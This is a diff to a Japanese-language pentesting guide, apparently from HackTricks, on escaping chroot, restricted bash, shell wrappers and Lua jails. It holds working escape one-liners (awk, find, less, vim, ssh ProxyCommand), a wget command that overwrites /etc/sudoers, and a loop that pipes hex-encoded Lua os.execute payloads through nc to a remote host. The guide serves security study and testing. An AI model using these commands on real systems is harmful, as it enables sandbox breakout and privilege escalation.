@@ -1,27 +1,25 @@
-# Jails からの Escape
-
-{{#include ../../banners/hacktricks-training.md}}
+# Jail からの脱出
 
 ## **GTFOBins**
 
-**"Shell" property を持つ binary を実行できるか、**[**https://gtfobins.github.io/**](https://gtfobins.github.io) **で検索してください**
+**"Shell" property を持つ binary を実行できるかどうか** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **で検索します**
 
 ## Chroot Escapes
 
-[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) より: chroot mechanism は、**特権を持つ** (**root**) **user による意図的な改ざんから防御することを目的としていません**。ほとんどの system では、chroot context は適切に stack されず、**十分な権限を持つ chroot 内の program は、2 回目の chroot を実行して脱出できる場合があります**。\
-通常、これは escape に chroot 内で root になる必要があることを意味します。
+[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) より: chroot mechanism は、**privileged** (**root**) **users** による意図的な改変から防御することを**意図していません**。ほとんどのシステムでは、chroot contexts は正しく stack されず、**十分な privileges を持つ** chrooted programs は、**2 回目の chroot を実行して脱出できる場合があります**。\
+通常、これは脱出するために chroot 内で root になる必要があることを意味します。<sup>[[4]](#references)</sup>
 
 > [!TIP]
-> **tool** [**chw00t**](https://github.com/earthquake/chw00t) は、以下の scenario を悪用して `chroot` から escape するために作成されました。<sup>[[1]](#references)</sup>
+> **tool** [**chw00t**](https://github.com/earthquake/chw00t) は、以下の scenarios を abuse して `chroot` から脱出するために作成されました。<sup>[[1]](#references)[[5]](#references)</sup>
 
 ### Root + CWD
 
 > [!WARNING]
-> chroot 内で **root** の場合、**別の chroot を作成して escape できます**。これは (Linux では) 2 つの chroot が共存できないためです。そのため、folder を作成し、**自分がその外側にいる状態で**その新しい folder に対して **新しい chroot を作成**すると、あなたは **新しい chroot の外側にいる**ことになり、したがって FS 内にいることになります。
+> chroot 内で **root** の場合、**別の chroot を作成して脱出できます**。これは (Linux では) 2 つの chroot が共存できないためです。そのため、folder を作成し、その新しい folder に対して **新しい chroot を作成**し、その際に**自分自身をその外側に置く**と、結果として**新しい chroot の外側にいる**ことになり、FS 内にいる状態になります。
 >
-> これは通常、chroot が working directory を指定された場所に移動させないために起こります。そのため、chroot を作成しても、その外側にいることができます。
+> これは通常、chroot が working directory を指定された場所へ移動させないために発生します。そのため、chroot を作成しても、その外側にいることができます。<sup>[[4]](#references)[[5]](#references)</sup>
 
-通常、chroot jail 内に `chroot` binary はありませんが、binary を **compile、upload、execute** することはできます:
+通常、chroot jail 内に `chroot` binary はありませんが、binary を**compile、upload、execute**することは**可能です**:
 
 <details>
 
@@ -79,7 +77,7 @@ system("/bin/bash");
 ### Root + Saved fd
 
 > [!WARNING]
-> これは前のケースと似ていますが、この場合、**attacker は現在のディレクトリへの file descriptor を保存**してから、**新しいフォルダに chroot を作成**します。最後に、chroot の**外部**でその **FD** に**アクセス**できるため、それにアクセスして **escape** します。
+> これは前のケースと似ていますが、このケースでは**攻撃者が現在のディレクトリへのファイルディスクリプターを保存**し、その後、**新しいフォルダーに chroot を作成**します。最終的に、chroot の**外部**でその**FD**への**アクセス**を持っているため、それにアクセスして**脱出**します。<sup>[[4]](#references)[[5]](#references)</sup>
 
 <details>
 
@@ -109,14 +107,14 @@ chroot(".");
 ### Root + Fork + UDS (Unix Domain Sockets)
 
 > [!WARNING]
-> FD は Unix Domain Sockets 経由で渡せるため、以下を行います。
+> FD は Unix Domain Sockets 経由で渡すことができるため、次の手順を実行します。
 >
 > - 子プロセスを作成する（fork）
 > - 親プロセスと子プロセスが通信できるように UDS を作成する
-> - 子プロセスで別のフォルダーに chroot を実行する
-> - 親プロセスで、新しい子プロセスの chroot の外側にあるフォルダーの FD を作成する
+> - 子プロセス内で、別のフォルダに対して chroot を実行する
+> - 親プロセスで、新しい子プロセスの chroot の外側にあるフォルダの FD を作成する
 > - UDS を使用して、その FD を子プロセスに渡す
-> - 子プロセスでその FD に対して chdir する。FD が chroot の外側にあるため、jail から脱出できる
+> - 子プロセスでその FD に対して chdir を実行する。FD は子プロセスの chroot の外側にあるため、jail から脱出できます。<sup>[[5]](#references)[[6]](#references)</sup>
 
 ### Root + Mount
 
@@ -125,30 +123,30 @@ chroot(".");
 > - root device (/) を chroot 内のディレクトリに mount する
 > - そのディレクトリに chroot する
 >
-> これは Linux で可能です
+> これは Linux で可能です。<sup>[[5]](#references)</sup>
 
 ### Root + /proc
 
 > [!WARNING]
 >
-> - chroot 内のディレクトリに procfs を mount する（まだ存在しない場合）
-> - /proc/1/root のように、異なる root/cwd エントリを持つ pid を探す
-> - そのエントリに chroot する
+> - procfs を chroot 内のディレクトリに mount する（まだ mount されていない場合）
+> - 異なる root/cwd エントリを持つ pid を探す。例: /proc/1/root
+> - そのエントリに chroot する。<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>
 
 ### Root(?) + Fork
 
 > [!WARNING]
 >
-> - Fork（子プロセス）を作成し、ファイルシステム内のより深い別のフォルダーに chroot して、そこへ CD する
-> - 親プロセスから、子プロセスが存在するフォルダーを、子プロセスの chroot より前のフォルダーへ移動する
-> - この子プロセスは chroot の外側にいることを認識する
+> - Fork（子プロセス）を作成し、FS 内のより深い別のフォルダに chroot して、そのフォルダに CD する
+> - 親プロセスから、子プロセスがいるフォルダを、子プロセスの chroot より前のフォルダに移動する
+> - この子プロセスは chroot の外側にいることになります。<sup>[[5]](#references)</sup>
 
 ### ptrace
 
 > [!WARNING]
 >
-> - 以前は、ユーザーが自身のプロセスを別の自身のプロセスから debug できましたが、現在はデフォルトではできません
-> - それでも可能であれば、プロセスに ptrace して、その内部で shellcode を実行できます（[この例を参照](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)）。
+> - プロセスが `ptrace` で attach できるかどうかは、credentials、capabilities、および Yama などの有効な security modules に依存します。そのため、同一ユーザーによる debugging も system policy によって制限される場合があります。<sup>[[8]](#references)</sup>
+> - attach が許可されている場合、プロセスに ptrace して、その内部で shellcode を実行できます（[この例を参照](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)）。<sup>[[5]](#references)[[8]](#references)</sup>
 
 ## Bash Jails
 
@@ -167,22 +165,24 @@ compgen -c | sort -u
 enable -a
 type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
 ```
-### PATH の変更
+### PATHの変更
 
-PATH 環境変数を変更できるか確認します<sup>[[2]](#references)</sup。
+PATH環境変数を変更できるか確認します。<sup>[[2]](#references)</sup>
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
 echo /home/* #List directory
 ```
-### vimを使う
+### vim の使用
+
+Vim が利用可能な場合は、実行可能な `shell` を設定し、`:shell` を実行します。<sup>[[10]](#references)</sup>
 ```bash
 :set shell=/bin/sh
 :shell
 ```
 ### Pagers と help viewers
 
-多くの制限環境では、依然として **pagers** や **help viewers** が利用可能です。通常、`PATH` を再構築しようとするよりも、これらを悪用するほうが簡単です。
+多くの restricted environments では、**pagers** や **help viewers** が依然として利用可能です。通常、`PATH` を再構築しようとするよりも、これらを abuse するほうが簡単です。
 ```bash
 less /etc/hosts
 !/bin/sh
@@ -192,15 +192,15 @@ man man
 
 man '-H/bin/sh #' man
 ```
-`git` が利用可能な場合、そのヘルプ出力は通常 pager を経由することに注意してください：
+`git` が利用可能な場合、その `--paginate` オプションは出力を `less` または `$PAGER` に送信するため、pager escape が利用可能な場合に便利です。<sup>[[9]](#references)</sup>
 ```bash
 PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
 # Or: git help config
 # Then inside the pager: !/bin/sh
 ```
-### よくある GTFOBins のワンライナー
+### Common GTFOBins one-liners
 
-アクセス可能なバイナリがわかったら、まずは明らかな shell spawner をテストします：
+アクセス可能なバイナリが判明したら、まずは明らかな shell spawner をテストします：
 ```bash
 awk 'BEGIN {system("/bin/sh")}'
 find . -exec /bin/sh \; -quit
@@ -209,31 +209,33 @@ zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
 script /dev/null -c bash
 ssh localhost /bin/sh
 ```
-引数を自由に実行するのではなく、許可されたコマンドにのみ**引数を注入**できる場合は、**GTFOArgs**も確認してください。
+許可された command を自由に実行するのではなく、**引数を inject** することしかできない場合は、**GTFOArgs** も確認してください。<sup>[[17]](#references)</sup>
 
-### スクリプトを作成
+### script の作成
 
-内容として _/bin/bash_ を持つ実行可能ファイルを作成できるか確認します。
+内容として _/bin/bash_ を持つ executable file を作成できるか確認します
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
 ### SSH から bash を取得
 
-ssh 経由でアクセスしている場合、制限された login shell の代わりに、サーバーへ**別のプログラム**を実行するよう要求できることがあります。
+ssh 経由でアクセスしている場合、restricted login shell の代わりにサーバーへ**別のプログラム**を実行させられることがあります。<sup>[[14]](#references)</sup>
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
 ssh user@<IP> -t "/bin/sh"
 ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
-`ssh` がローカルで許可されている数少ないバイナリの 1 つである場合、**GTFOBin** として悪用することもできる点に注意してください：
+`ssh` がローカルで許可されている数少ないバイナリの 1 つである場合、それが **GTFOBin** として悪用できることも覚えておいてください。`LocalCommand` および `ProxyCommand` オプションは、ローカルで設定されたヘルパーコマンドを実行します。<sup>[[14]](#references)[[15]](#references)</sup>
 ```bash
 ssh localhost /bin/sh
 ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
 ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
 ```
 ### 宣言
+
+Bashでは、namerefは代入を別の変数にリダイレクトし、`BASH_CMDS`に要素を追加すると、そのコマンドがBashの内部コマンドハッシュテーブルに追加されます。<sup>[[11]](#references)[[12]](#references)</sup>
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
 
@@ -241,19 +243,19 @@ BASH_CMDS[shell]=/bin/bash;shell -i
 ```
 ### Wget
 
-例えば sudoers ファイルを上書きできます。
+Wgetの`-O`オプションは、downloadしたコンテンツを指定したoutput fileに書き込みます。そのパスが書き込み可能な場合、`/etc/sudoers`などのファイルを上書きできます。<sup>[[13]](#references)</sup>
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
-### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)
+### 制限付き shell wrapper（`git-shell`、`rssh`、`lshell`）
 
-一部の環境では、通常の `rbash` ではなく、`git-shell`、`rssh`、`lshell` などの **wrappers** に接続されます。
+環境によっては、通常の `rbash` ではなく、`git-shell`、`rssh`、`lshell` などの **wrapper** に接続されることがあります。
 
-- `git-shell` は、server-side Git commands と `~/git-shell-commands/` 内に存在するものだけを受け付けます。そのディレクトリが存在する場合は、`help` を実行して許可されているカスタムアクションを列挙します。そこに**書き込み**できる場合、そのディレクトリに配置した実行可能ファイルはすべて到達可能になります。<sup>[[3]](#references)</sup>
-- `rssh` / `lshell` では、通常 `scp`、`sftp`、`rsync`、または Git-style operations のみが許可されます。その場合は、まず**ファイル書き込みプリミティブ**に注目します。`authorized_keys`、shell startup file、または helper script を書き込み可能な場所にアップロードし、その後 `ssh -t ...` で再接続します。
-- wrapper が command line のフィルタリングのみを行う場合は、到達可能なバイナリを列挙し、そこから **GTFOBins / GTFOArgs** に戻って pivot します。
+- `git-shell` は、サーバー側の Git コマンドと、`~/git-shell-commands/` 内に存在するものだけを受け付けます。このディレクトリが存在する場合は、`help` を実行して許可されているカスタムアクションを列挙します。そこに **write** できる場合、そのディレクトリに配置した実行可能ファイルはすべて到達可能になります。<sup>[[3]](#references)</sup>
+- `rssh` / `lshell` では、一般的に `scp`、`sftp`、`rsync`、または Git 形式の操作だけが許可されます。その場合は、まず **file write primitive** に注目します。`authorized_keys`、shell startup file、または helper script を write 可能な場所にアップロードし、その後 `ssh -t ...` で再接続します。
+- wrapper が command line だけをフィルタリングしている場合は、到達可能な binary を列挙し、そこから **GTFOBins / GTFOArgs** に移行します。
 
-### Other tricks
+### その他の tricks
 
 以下も確認してください。
 
@@ -262,7 +264,7 @@ wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 - [**GTFOBins**](https://gtfobins.org/)
 - [**GTFOArgs**](https://gtfoargs.github.io/)
 
-**次のページも興味深いかもしれません。**
+**以下のページも興味深いかもしれません。**
 
 {{#ref}}
 ../linux-basics/bypass-linux-restrictions/
@@ -270,7 +272,7 @@ wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 
 ## Python Jails
 
-Python jails から escape するための tricks は、次のページにあります。
+python jail から脱出する tricks については、以下のページを参照してください。
 
 
 {{#ref}}
@@ -279,22 +281,22 @@ Python jails から escape するための tricks は、次のページにあり
 
 ## Lua Jails
 
-このページでは、Lua 内でアクセスできる global functions を確認できます。[https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)
+このページでは、lua 内でアクセス可能な global function を確認できます：[https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)。<sup>[[16]](#references)</sup>
 
-**Eval with command execution:**
+標準の `load`、`string.char`、`os.execute` function が利用可能な場合、これらを使ってこの chunk を構築し、実行できます。<sup>[[16]](#references)</sup>
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
-**ドットを使わずにライブラリの関数を呼び出す**ためのいくつかのテクニック：
+テーブル関数は、ドット構文の代わりに `rawget` を使って取得することもできます。<sup>[[16]](#references)</sup>
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
-ライブラリの関数を列挙する：
+`pairs`を使用してライブラリテーブルを列挙します。<sup>[[16]](#references)</sup>
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-なお、前述の one liner を**異なる lua environment で実行するたびに、関数の順序が変わります**。したがって、特定の関数を実行する必要がある場合は、異なる lua environment をロードして le library の最初の関数を呼び出す brute force attack を実行できます：
+`pairs` がテーブルのインデックスを列挙する順序は未規定であるため、特定の関数が最初に現れることを前提にしてはいけません。特定の関数を実行する必要がある場合は、異なる lua environments を読み込み、ライブラリの最初の関数を呼び出すことで brute force attack を実行できます。<sup>[[16]](#references)</sup>
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -305,14 +307,27 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-**interactive lua shell を取得**: limited lua shell 内にいる場合、以下を呼び出すことで新しい lua shell（うまくいけば unlimited）を取得できます:
+**interactive lua shell の取得**: 制限された lua shell 内にいる場合、`debug.debug()` を呼び出すことで新しい lua shell（できれば無制限のもの）を取得できます。これにより interactive mode に入ります。<sup>[[16]](#references)</sup>
 ```bash
 debug.debug()
 ```
-## 参考文献
+## References
 
-- [1] [Chw00t: さまざまな chroot ソリューションから脱出する方法（Bucsay Balazs、DeepSec の講演とスライド）](https://www.youtube.com/watch?v=UO618TeyCWo)
+- [1] [Chw00t: さまざまな chroot ソリューションから脱出する方法 (Bucsay Balazs、DeepSec の講演とスライド)](https://www.youtube.com/watch?v=UO618TeyCWo)
 - [2] [GNU Bash Reference Manual – 制限付き Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
-- [3] [git-shell – Git ドキュメント](https://git-scm.com/docs/git-shell)
-
+- [3] [git-shell – Git Documentation](https://git-scm.com/docs/git-shell)
+- [4] [chroot(2) – Linux manual page](https://man7.org/linux/man-pages/man2/chroot.2.html)
+- [5] [chw00t – chroot escape tool](https://github.com/earthquake/chw00t)
+- [6] [unix(7) – Linux manual page](https://man7.org/linux/man-pages/man7/unix.7.html)
+- [7] [proc_pid_root(5) – Linux manual page](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
+- [8] [ptrace(2) – Linux manual page](https://man7.org/linux/man-pages/man2/ptrace.2.html)
+- [9] [git – Git Documentation](https://git-scm.com/docs/git)
+- [10] [:shell – Vim documentation](https://vimhelp.org/various.txt.html#%3Ashell)
+- [11] [Bash Builtins – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
+- [12] [Bash Variables – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
+- [13] [GNU Wget Manual](https://www.gnu.org/software/wget/manual/wget.html)
+- [14] [ssh(1) – OpenBSD manual page](https://man.openbsd.org/ssh)
+- [15] [ssh_config(5) – OpenBSD manual page](https://man.openbsd.org/ssh_config)
+- [16] [Lua 5.4 Reference Manual](https://www.lua.org/manual/5.4/manual.html)
+- [17] [GTFOArgs: Argument Injection Exploitation Vector List](https://gtfoargs.github.io/)
 {{#include ../../banners/hacktricks-training.md}}
